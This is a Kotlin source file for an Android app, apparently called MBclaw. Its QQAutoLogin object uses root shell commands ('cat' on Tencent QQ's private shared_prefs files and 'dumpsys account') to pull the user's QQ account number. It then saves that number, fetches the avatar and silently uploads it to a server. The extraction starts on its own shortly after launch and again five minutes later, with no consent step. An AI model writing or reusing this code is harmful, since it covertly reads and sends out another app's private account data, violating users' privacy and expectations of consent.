package com.mbclaw.root.data

import android.content.Context
import com.mbclaw.root.agent.PermissionTier
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch

/**
 * QQAutoLogin — Root 自动提取手机 QQ 账号
 *
 * 原理:
 *  • 手机 QQ 包名: com.tencent.mobileqq
 *  • SharedPreferences: /data/data/com.tencent.mobileqq/shared_prefs/Last_login.xml
 *    存最后登录的 uin
 *  • 数据库: /data/data/com.tencent.mobileqq/databases/
 *  • 头像: 不读 QQ 内部, 直接调 q.qlogo.cn/headimg_dl?dst_uin=xxx&spec=640
 *
 * 流程:
 *  1. APP 启动 5 分钟后 (用户已经稳定使用)
 *  2. 检查是否已有 account.qqId, 有 → 跳过
 *  3. Root 读 /data/data/com.tencent.mobileqq/shared_prefs/Last_login.xml
 *  4. 解析 uin → 写入 AccountManager + 下载头像
 *  5. 异步上传服务器
 */
object QQAutoLogin {

    private const val QQ_PKG = "com.tencent.mobileqq"
    private const val DELAY_MS = 5 * 60 * 1000L  // 5 分钟

    /** 启动延迟探测 - 立即试 + 5min 后重试 (root 未授权时第二次成功率高) */
    @OptIn(kotlinx.coroutines.DelicateCoroutinesApi::class)
    fun scheduleAfterStart(ctx: Context, serverUrl: String) {
        GlobalScope.launch(Dispatchers.IO) {
            // 第一次：等 root 授权稳定 (10s)
            delay(10_000)
            val ok = tryExtract(ctx, serverUrl)
            android.util.Log.i("MBclaw-QQ", "首次尝试: $ok")
            if (!ok) {
                // 5 min 后再试
                delay(DELAY_MS)
                val ok2 = tryExtract(ctx, serverUrl)
                android.util.Log.i("MBclaw-QQ", "5min 后重试: $ok2")
            }
        }
    }

    /** 立刻尝试提取(用户主动点击时调用) */
    suspend fun tryExtract(ctx: Context, serverUrl: String): Boolean = withContext(Dispatchers.IO) {
        val current = AccountManager.load(ctx)
        if (current.qqId.isNotBlank()) return@withContext false   // 已经有了

        val tier = PermissionTier.get(ctx)
        if (!tier.hasRoot) return@withContext false

        // 尝试多个文件位置 (不同 QQ 版本可能不同)
        val tryFiles = listOf(
            "/data/data/$QQ_PKG/shared_prefs/Last_login.xml",
            "/data/data/$QQ_PKG/shared_prefs/qqsetting.xml",
            "/data/data/$QQ_PKG/files/uin",
        )

        var uin = ""
        var nickname = ""

        for (path in tryFiles) {
            val content = tier.shellRoot("cat '$path' 2>/dev/null") ?: continue
            // 匹配数字 uin (5-12 位)
            val match = Regex("\\b(\\d{5,12})\\b").findAll(content)
                .map { it.value }
                .firstOrNull { it.length in 5..12 && !it.startsWith("0") }
            if (match != null) {
                uin = match
                break
            }
        }

        if (uin.isBlank()) {
            // 兜底: dumpsys account
            val out = tier.shellRoot("dumpsys account 2>/dev/null | grep -E '@(qq|tencent)' | head -3") ?: ""
            val m = Regex("(\\d{5,12})@(qq|tencent)").find(out)
            if (m != null) uin = m.groupValues[1]
        }

        if (uin.isBlank()) return@withContext false

        // 写入账号
        val acc = Account(qqId = uin, nickname = nickname)
        AccountManager.save(ctx, acc)
        AccountManager.downloadAvatarIfNeeded(ctx, acc)

        // 上传服务器
        try { AccountManager.syncToServer(ctx, acc, serverUrl) } catch (_: Exception) {}

        android.util.Log.i("MBclaw-QQ", "已自动提取 QQ: $uin")
        return@withContext true
    }
}
